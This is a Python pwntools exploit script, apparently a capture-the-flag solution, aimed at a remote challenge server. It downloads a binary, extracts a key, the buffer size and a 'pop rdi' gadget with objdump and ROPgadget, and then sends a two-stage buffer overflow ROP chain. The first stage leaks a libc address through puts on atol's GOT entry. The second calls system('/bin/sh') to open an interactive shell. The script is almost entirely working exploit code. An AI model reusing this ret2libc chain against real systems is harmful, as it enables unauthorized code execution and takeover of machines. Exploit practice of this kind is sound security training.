from pwn import *
import base64
import os
import sys

context.log_level = "debug"

key = 1
buffer_size = 1
gadget = 1
l = ELF('/root/pwn/libc-database/db/libc6_2.23-0ubuntu10_amd64.so')

def get_key():
	global key

	result = subprocess.check_output('objdump -d trust_binary | grep movq',shell = True)	
	print 'shell result : ' + result
	start = result.find('$')
	end = result.find(',')
	
	key = int(result[start+1:end],16)
	log.info( 'key value = ' + str(key))

def find_buffer_size():
	global buffer_size

	result = subprocess.check_output('objdump -d trust_binary | grep lea',shell = True)
        print 'shell result : ' +  result
        start = result.find('-')
        end = result.find('(')

        buffer_size = int(result[start+1:end],16)
        log.info('buffer_size = ' + str(buffer_size))
	
def find_pop_rdi_gadget():
	global gadget
	result = subprocess.check_output("ROPgadget --binary trust_binary | grep 'pop rdi'", shell = True)
        print 'shell result : ' + result

	end = result.find('pop')
	
        gadget = int(result[0:end].replace(':',''),16)

        log.info('pop rdi; ret; = ' + str(hex(gadget)))

p = remote('0x0.site',12203)

p.recvuntil('------- BINARY -------')

binary = p.recvuntil('=').strip()
binary = base64.b64decode(binary)
print hexdump(binary) 

f = open('./trust_binary', 'wb')
f.write(binary)
f.close()

r = ELF('./trust_binary')

get_key()
find_buffer_size()
find_pop_rdi_gadget()
main = 0x4007ae


p.recvuntil('------- PROCESS -------')

p.recvuntil('exploit key : ')
p.sendline(str(key))

payload = 'a' * (buffer_size +8)
payload += p64(gadget)
payload += p64(r.got['atol'])
payload += p64(r.plt['puts'])
payload += p64(main)

p.recvuntil('exploit : ')
p.sendline(payload)

'''
t = process('./trust_binary')
t.sendlineafter('exploit key : ', str(key))
t.sendlineafter('exploit : ', payload)
t.interactive()
'''
libc = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')) - l.sym['atol']
log.info('libc : ' + hex(libc))

p.recvuntil('exploit key : ')
p.sendline(str(key))

payload = 'a' * (buffer_size + 8)
payload += p64(gadget)
payload += p64(libc + next(l.search('/bin/sh\x00')))
payload += p64(libc + l.sym['system'])

p.recv()
p.sendline(payload)


p.interactive()
